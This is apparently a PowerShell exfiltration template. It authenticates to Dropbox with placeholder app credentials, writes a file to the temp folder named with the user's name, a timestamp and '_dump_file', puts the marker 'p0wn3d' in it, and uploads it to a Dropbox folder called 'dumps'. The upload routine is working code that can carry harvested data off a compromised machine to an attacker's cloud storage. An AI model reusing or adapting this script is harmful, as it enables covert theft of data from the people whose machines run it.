################################################################################
# Dropbox Functions
################################################################################

function Dropbox-Get-TemporaryAccessToken {

    param ($AppKey, $AppSecret, $RefreshToken)

    $base64AuthInfo = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("{0}:{1}" -f $AppKey,$AppSecret)))
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", "Basic {0}" -f $base64AuthInfo)
    $headers.Add("Content-Type", "application/x-www-form-urlencoded")
    $body = "grant_type=refresh_token&refresh_token={0}" -f $RefreshToken

    $response = Invoke-RestMethod 'https://api.dropbox.com/oauth2/token' -Method 'POST' -Headers $headers -Body $body

    $TemporaryAccessToken = $response.access_token

    return $TemporaryAccessToken
}

function Dropbox-Upload-File {

    param ($SourceFileName, $SourceFolder, $TargetFolder, $DropboxAccessToken)

    $SourceFilePath="$SourceFolder\$SourceFileName"
    $TargetFilePath="/$TargetFolder/$SourceFileName"

    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropboxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')

    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

################################################################################
# Dropbox Keys and Token Setup
################################################################################

$MyAppKey       = "<APP_KEY>"
$MyAppSecret    = "<APP_SECRET>"
$MyRefreshToken = "<REFRESH_TOKEN>"

################################################################################

# Get Dropbox Access Token
$MyDropboxAccessToken = Dropbox-Get-TemporaryAccessToken $MyAppKey $MyAppSecret $MyRefreshToken

# Specify Output File name and path
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_dump_file.txt"
$OutputFilePath = "$env:TMP\$FileName"

# Writes to Output File
echo "p0wn3d" >> $OutputFilePath

# Upload output file to dropbox
Dropbox-Upload-File $FileName $env:TMP "dumps" $MyDropboxAccessToken

